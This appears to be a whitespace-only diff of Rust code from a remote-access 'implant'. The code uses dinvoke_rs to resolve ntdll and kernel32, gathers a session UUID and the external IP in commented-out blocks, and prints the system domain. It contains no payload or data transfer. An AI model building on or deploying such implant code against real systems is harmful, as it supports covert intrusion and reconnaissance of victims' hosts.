@@ -24,7 +24,7 @@ pub extern "system" fn Pick() {
     let kernel32 = dinvoke_rs::dinvoke::get_module_base_address("kernel32.dll");
 
     //this is a test to make sure dinvoke is working as expected
-    /* 
+    /*
     if ntdll == 0 {
         println!("Failed to locate ntdll.dll");
         return;
@@ -33,7 +33,7 @@ pub extern "system" fn Pick() {
     let version = func::get_version(ntdll);
     println!("Version: {}", version);
     */
-/* 
+/*
     let imp_info = ImpInfo {
         session: env!("UUID").to_string(), //grabs the UUID from the environment used to build the implant
         ip: func::get_external_ip(ntdll, kernel32),        //replace with real get_external_ip function
@@ -65,5 +65,5 @@ pub extern "system" fn Pick() {
 
     //call the get_system_domain fn and print the string
     println!("domain: {}", func::get_system_domain());
-    
+
 }
